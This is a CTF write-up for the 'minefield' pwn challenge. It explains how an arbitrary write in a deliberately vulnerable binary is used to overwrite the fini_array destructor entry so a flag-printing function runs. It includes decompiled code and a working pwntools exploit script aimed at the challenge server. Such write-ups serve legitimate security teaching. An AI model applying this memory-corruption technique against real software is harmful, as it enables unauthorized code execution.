# minefield

One of the easiest challenge from the pwn section. This was also a good challenge for newbies to learn about the how ELF works.

# Vulnerability

The binary had Canary and NX enabled, guess no more stack overflows D:

```r
❯ checksec minefield
[*] '/media/d4mianwayne/New Volume/Projects/PwnLand/CTFs/CyberApocalypse2021/minefield/minefield'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

This binary eventually calls a function named `mission` which allow us to perform an arbitrary write.

```C
unsigned __int64 mission()
{
  _QWORD *v1; // [rsp+0h] [rbp-30h]
  char nptr[10]; // [rsp+14h] [rbp-1Ch] BYREF
  char v3[10]; // [rsp+1Eh] [rbp-12h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Insert type of mine: ");
  r(nptr);
  v1 = (_QWORD *)strtoull(nptr, 0LL, 0);
  printf("Insert location to plant: ");
  r(v3);
  puts("We need to get out of here as soon as possible. Run!");
  *v1 = strtoull(v3, 0LL, 0);
  return __readfsqword(0x28u) ^ v4;
}
```

We also had a function named `_` which peform `cat flag` for us.

```C
unsigned __int64 _()
{
  size_t v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v0 = strlen(aMissionAccompl);
  write(1, aMissionAccompl, v0);
  system("cat flag*");
  return __readfsqword(0x28u) ^ v2;
}
```

# Exploitation

Well, the challenge objective was clear, since we had an arbitrary write, we have to perform a GOT overwrite such that once it's called it'll jump to the overwritten address and we had RELRO off, so it was obvious from straight point of view, but the problem was, once the arbitrary write is done, none of imported functions were being called, so that proposed a problem.

So, that became a problem quickly, well no, there exists a `__do_global_dtors_aux_fini_array_entry` which is called when the process exit, it contains a number of functions. These are called global destructors, so in the end, we just had to overwrite the `__do_global_dtors_aux_fini_array_entry` with the address `_` function which prints the flag:-

```py
from pwn import *

p = remote("138.68.168.137", 32479)
elf = ELF("minefield")


# overwrite __fini_array
p.sendlineafter("> ", "2")
pause()
p.sendlineafter(": ", str(6295672))
p.sendlineafter(": ", str(elf.symbols['_']))

p.interactive()
```

Flag: `CHTB{d3struct0r5_m1n3f13ld}`

Flag: 